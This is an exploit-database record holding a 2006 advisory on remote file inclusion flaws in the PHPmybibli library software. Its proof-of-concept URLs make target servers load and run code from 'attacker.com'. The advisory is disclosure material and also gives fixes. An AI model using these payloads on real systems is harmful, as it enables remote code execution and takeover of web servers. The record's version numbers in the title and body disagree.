{
  "id": "2585",
  "title": "PHPmybibli 3.0.1 - Multiple Remote File Inclusions",
  "cve": "CVE-2006-5402",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_55$2006\r\n\r\n-----------------------------------------------------------------------------------------------\r\n[ECHO_ADV_55$2006]Phpmybibli  <=2.1  Multiple Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Dedi Dwianto a.k.a the_day\r\nDate Found\t: October, 17th 2006\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv55-theday-2006.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication\t: PHPmybibli\r\nversion\t\t: <=2.1\r\nURL\t\t: http://www.pizz.net/\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nI found vulnerability script cart.php\r\n--------------------------cart.php---------------------------------------\r\n....\r\n<?\r\n\r\n  include_once(\"$include_path/cart.inc.php\");\r\n  include_once(\"$include_path/templates/cart.tpl.php\");\r\n  include_once(\"$include_path/isbn.inc.php\");\r\n  include_once(\"$include_path/expl_info.inc.php\");\r\n  include_once(\"$include_path/bull_info.inc.php\");\r\n  include_once(\"$include_path/notice_authors.inc.php\");\r\n  include_once(\"$include_path/notice_categories.inc.php\");\r\n  include_once(\"$include_path/explnum.inc.php\");\r\n  include_once(\"$class_path/cart.class.php\");\r\n  include_once(\"$class_path/caddie.class.php\");\r\n  include_once(\"$class_path/author.class.php\");\r\n  include_once(\"$class_path/collection.class.php\");\r\n  include_once(\"$class_path/subcollection.class.php\");\r\n  include_once(\"$class_path/mono_display.class.php\");\r\n  include_once(\"$class_path/serie.class.php\");\r\n  include_once(\"$class_path/serial_display.class.php\");\r\n  include_once(\"$class_path/serials.class.php\");\r\n  include_once(\"$class_path/editor.class.php\");\r\n  require_once(\"$class_path/emprunteur.class.php\");\r\n  require_once(\"$javascript_path/misc.inc.php\");\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$include_path\" parameter in cart.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nAlso affected files on Files:\r\n\r\nedit.php\r\ncirc.php\r\nindex.php\r\nselect.php\r\netc..\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[phpmybibli_path]/index.php?class_path=http://attacker.com/inject.txt?\r\nhttp://target.com/[phpmybibli_path]/edit.php?javascript_path=http://attacker.com/inject.txt?\r\nhttp://target.com/[phpmybibli_path]/circ.php?include_path=http://attacker.com/inject.txt?\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Sanitize variable $class_path,$javascript_path,$include_path on affected files.\r\n- Turn off register_globals\r\n\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy My Brain\r\n~ az001,bomm_3x,matdhule,angelia\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~\r\n     EcHo Research & Development Center\r\n     the_day[at]echo[dot]or[dot]id\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2006-10-17]",
  "url": "https://www.exploit-db.com/exploits/2585"
}